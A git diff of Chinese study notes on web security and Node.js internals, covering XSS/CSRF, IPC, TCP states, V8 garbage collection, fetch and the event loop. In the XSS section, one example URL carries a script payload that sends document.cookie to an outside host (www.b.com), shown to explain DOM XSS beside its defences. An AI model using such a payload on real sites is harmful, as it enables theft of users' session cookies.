@@ -227,7 +227,8 @@
   - 存储型XSS：用户提交恶意表单，数据被存入数据库，其他用户请求的，浏览器执行了恶意表单中的代码
   - 反射型XSS：将用户输入的存在XSS攻击的数据，发送给后台，后台并未对数据进行存储，也未经过任何过滤，直接返回给客户端。被浏览器渲染
   - dom xss：比如访问如下链接http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie</script>
-  -  防御：一般是转义就行
+  - 防御：一般是转义就行
+  - csp防御：http://www.ruanyifeng.com/blog/2016/09/csp.html
 -  CSRF：跨站请求伪造（Cross-site request forgery）,冒充用户发起请求（在用户不知情的情况下）
   - 一般方式是诱导用户在正常网站发出攻击者想发出的请求
   - 防御：使用ajax、验证referer、在请求中添加token
@@ -390,8 +391,12 @@
     - 原始思路：master 进程创建 socket，绑定到某个地址以及端口后，自身不调用 listen 来监听连接以及 accept 连接，而是将该 socket 的 fd 传递到 fork 出来的 worker 进程，worker 接收到 fd 后再调用 listen，accept 新的连接。这样的实现开发者无法控制worker的负载均衡，会导致多个worker竞争，达不到负载均衡
     - 新思路：master 进程创建 socket，绑定地址以及端口后再进行监听。该 socket 的 fd 不传递到各个 worker 进程。当 master 进程获取到新的连接时，再决定将 accept 到的客户端连接分发给指定的 worker 处理，默认的分发算法是round-robin
     - 两种实现的区别主要是分发算法以及master是否listen
+  - linux下的ipc通信方式：流管道、消息队列、共享内存、套接字（socket)
+  - nodejs的ipc通信：windows使用named pipe，*nix 系统则采用 UDS (Unix Domain Socket) 实现
   - 父子进程IPC通道建立：父进程创建一个pipe，并保存对管道一端的操作，然后fork一个子进程，并通过环境变量将管道的另一端文件描述符 fd 传递到子进程，子进程启动后通过环境变量拿到 fd，并将 fd 绑定到一个新构造的 pipe 上，最后通道建立
   - http://taobaofed.org/blog/2015/11/10/nodejs-cluster-2/
+- 调用系统命令fork出的子进程需要自己管理，用nodejs child_process.fork()创建的进程可选自己管理或者由nodejs自动释放（默认自动释放）
+- child.kill 与 child.send 的区别. 二者一个是基于信号系统, 一个是基于 IPC
 - Buffer大小是固定不变的, 并且其内存在 V8 堆栈外分配原始内存空间. Buffer 类的实例创建之后, 其所占用的内存大小就不能再进行调整  
 - Duplex 流和 Transform 流都是同时可读写的, 他们会在内部维持两个缓冲区, 分别对应读取和写入, 这样就可以允许两边同时独立操作
 - bind方法绑定作用域后，再bind到不同的作用域，不会生效。因为console的方法在实现时已经bind过了，所以对console的方法执行bind不会生效
@@ -403,7 +408,8 @@
   - 解决方式：禁用tcp的缓存算法、发一个包等一段时间、或进行封包/拆包（肯定是选择最后一种解决方式啊）
   - udp不存在粘包是因为udp的包是一个一个地发的
 - tcp三次握手、四次挥手对应的状态：CLOSED、LISTEN、SYN-SENT、SYN-RECEIVED、ESTABLISHED、CLOSE-WAIT、LAST-ACK、FIN-WAIT-1、FIN-WAIT-2、CLOSING、TIME-WAIT
-  - TIME_WAIT：连接放主动断开连接，四次挥手时，等待对方的ack，todo
+  - TIME-WAIT：连接放主动断开连接，四次挥手时，等待对方的ack，出现大量的 TIME_WAIT 比较常见的情况是, 并发量大, 服务器在短时间断开了大量连接. 对应 HTTP server 的情况可能是没开启 keepAlive. 如果有开 keepAlive, 一般是等待客户端自己主动断开, 那么TIME_WAIT 就只存在客户端, 而服务端则是 CLOSE_WAIT 的状态, 如果服务端出现大量 CLOSE_WAIT, 意味着当前服务端建立的连接大面积的被断开, 可能是目标服务集群重启之类.
+  - socket hang up：ang up 有挂断的意思, socket hang up 也可以理解为 socket 被挂断. 在 Node.js 中当你要 response 一个请求的时候, 发现该这个 socket 已经被 "挂断", 就会就会报 socket hang up 错误。典型的情况是用户使用浏览器, 请求的时间有点长, 然后用户简单的按了一下 F5 刷新页面. 这个操作会让浏览器取消之前的请求, 然后导致服务端 throw 了一个 socket hang up。
 - put与post请求差异
   - 语义：put是更新，post是增加
   - 幂等：put多次请求会得到同样的结果，是幂等的。post多次请求会创建多个资源，非幂等
@@ -453,9 +459,12 @@
 - v8
   - nodejs中默认限制了js的内存（64位为1.4GB，32位为0.7GB）,当然也可以打开限制
   - v8在垃圾回收时，js执行会停顿，v8的优化策略大概是，将清理过程拆分为小段，没清理一次，让js运行一段时间
-  - v8的垃圾回收会针对新生代对象、老生代对象采用不同的垃圾回收算法，
+  - v8的垃圾回收会针对新生代对象、老生代对象采用不同的垃圾回收算法，不管哪种算法，都是避免内存碎片，尽量保证内存连续
+    - 新生代算法：将堆内存分为两个相等的部分，只有一个处于使用中【称为From空间】，另一个处于闲置的状态【称为To空间】。分配对象时首先在From中分配，开始进行垃圾回收的时候，检查From中的存活的对象，将这些对象复制到To中，并且将From中的非存活的对象的空间释放。完成之后将From和To的角色对换。Scavenge算法只能只用空间的一半
+    - 老生代算法：在之后清除的阶段进行清除。这样处理的问题是，垃圾回收处理后的内存的空间会变成不连续的，这会对后续的内存的分配造成浪费。Mark-Compact的作用就是在Mark-Sweep的基础上多了一个合并内存空间的过程。V8在实际处理的时候只有在空间不足的时候使用Mark-Compact。因为老生代的堆空间比较大，在进行一次完成的老生代的垃圾回收造成的停顿较大，所以V8会将整个过程分为很多小步来完成（incremental marking），垃圾回收和Javascript的逻辑执行交替运行
   - 新生代的对象为存活时间较短的对象，老生代中的对象为存活时间较长或常驻内存的对象，当一个对象经过多次新生代的清理依旧幸存，这说明它的生存周期较长，也就会被移动到老生代，会被移动到老生代
   - nodejs默认为新生代分配的内存是64MB，当频繁地产生很多小对象时，这个区域会被占满，从而出触发gc
+  - 堆外内存（比如Buffer对象：不经过V8的内存分配机制，也不会有堆内存的大小限制
   - https://segmentfault.com/a/1190000000440270
 - Object.create就是以另一个对象为原型实例化一个对象，用于弥补非构造函数不能使用new操作符实例化继承的问题，从而可以用原型链的方式继承那个对象的方法和属性
     ```javascript
@@ -716,7 +725,7 @@
 - nodejs性能优化：
   - 使用新版本nodejs
   - 使用fast-json-stringify、考虑手写parse
-  - promise、async/await的性能和内存占用都比callback差，可以考虑require('bluebird').promise
+  - promise、async/await的性能和内存占用都比callback差，可以考虑require('bluebird').promise，使用一个await，v8可能需要两三个promise实例来实现
     - bluebird没有完全按照promise的标准实现，但覆盖了99%的场景
     - v8的promise是用js实现的，在其实现中，为每个promise实例都分配的几个数组、闭包，导致内存占用增大
   - 避免串行的await
@@ -742,3 +751,40 @@
     - 每一个函数都可以被看做独立单元，很有利于进行单元测试（unit testing）和除错（debugging），以及模块化组合
     - 开发快、易于理解
     - 代码能够热更新：函数式编程没有副作用，只要保证接口不变，内部实现是外部无关的。所以，可以在运行状态下直接升级代码，不需要重启，也不需要停机。
+- JSON.stringify会忽略值类型为symbol的属性，并且只会处理对象本身上的可遍历属性（不会处理原型上的）
+- v8默认没有开启尾递归优化，因为无法保证码农正确书写尾递归
+- 反模式：是指对反复出现的设计问题的常见的无力而低效的设计模式，俗话说就是重蹈覆辙。js中的反模式：使用了AMD，但是很多东西确实绑定到window的比如jQuery
+- fetch api：
+  - 兼容性比较差
+  - 默认不发送cookie，可以配置其credentials项选择不发送、允许同域发送、允许跨域发送
+  - 返回的promise只有网络错误才会reject，http状态码不为200页不会reject
+  - 不支持timeout，也不能取消，对应的可以设置xhr.timeout，可以xhr.abort()
+  - 不支持像xhr一样监听请求的状态
+  - 支持设置mode:no-cors，向不支持跨域的服务器请求，但不能读取响应的内容
+- await的参数只要是一个类的实例，并且这个类有then方法，await就会等到then方法中的resolve或reject被执行
+- 异步分析：await后的代码可以认为是一个异步微任务，p的then也是一个微任务，他们在同一个同步代码中被加入微任务队列。标准规定应该首先执行被链接的处理程序，然后再调用异步函数，也就是在微任务队列中应该先执行p的then，所以node10的行为是正确的
+  ```javascript
+    const p = Promise.resolve();
+    (async () => {
+      await p;
+      console.log('1');
+    })();
+    p.then(() => console.log('2'))
+      .then(() => console.log('3'));
+    // node8: 1 2 3
+    // node10: 2 3 1
+  ```
+- html的meta标签能模拟http响应头：
+  ```html
+    <meta http-equiv="Cache-Control" content="no-cache, must-revalidate" />
+  ```
+- nodejs事件循环依次阶段：
+  - timers：执行setTimeout() 和 setInterval()中到期的callback。
+  - I/O callbacks：上一轮循环中有少数的I/Ocallback会被延迟到这一轮的这一阶段执行
+  - idle, prepare：仅内部使用
+  - poll：最为重要的阶段，执行I/O callback，在适当的条件下会阻塞在这个阶段
+  - check：执行setImmediate的callback
+  - close callbacks：执行close事件的callback，例如socket.on("close",func)
+  - 每次一个阶段执行完，都会执行process.nextTick、以及微任务（先执行process.nextTick）
+- pm2原理
+  - satan负责退出、杀死进程（魔鬼），god进程负责保护重启进程（天使）、daemon（守护进程）就是nodejs原生cluster实现中的master
